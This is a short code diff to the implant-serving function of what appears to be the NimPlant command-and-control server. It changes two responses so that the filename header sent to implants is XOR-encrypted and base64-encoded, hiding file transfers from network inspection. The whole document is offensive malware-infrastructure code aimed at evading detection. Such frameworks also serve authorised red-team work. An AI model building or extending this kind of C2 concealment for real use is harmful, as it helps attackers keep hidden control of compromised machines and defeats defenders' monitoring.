@@ -521,7 +521,9 @@ def nim_implants_server(xor_key):
                             res = flask.make_response(result_gzipped)
                             res.mimetype = "application/x-gzip"
                             res.headers["Content-Encoding"] = "gzip"
-                            res.headers["X-Original-Filename"] = original_filename
+                            # Encrypt the filename with XOR before sending
+                            encrypted_filename = encrypt_data(original_filename, np.encryption_key)
+                            res.headers["X-Original-Filename"] = base64.b64encode(encrypted_filename).decode("utf-8")
                             return res
                         except Exception as e:
                             utils.nimplant_print(f"DEBUG: ERROR processing file from database: {str(e)}")
@@ -583,7 +585,8 @@ def nim_implants_server(xor_key):
                             res.mimetype = "application/x-gzip"
                             res.headers["Content-Encoding"] = "gzip"
                             # Also send the original name if it's a fallback
-                            res.headers["X-Original-Filename"] = os.path.basename(np.hosting_file)
+                            encrypted_filename = encrypt_data(os.path.basename(np.hosting_file), np.encryption_key)
+                            res.headers["X-Original-Filename"] = base64.b64encode(encrypted_filename).decode("utf-8")
                             return res
                         except Exception as e:
                             utils.nimplant_print(f"DEBUG: ERROR processing file: {str(e)}")
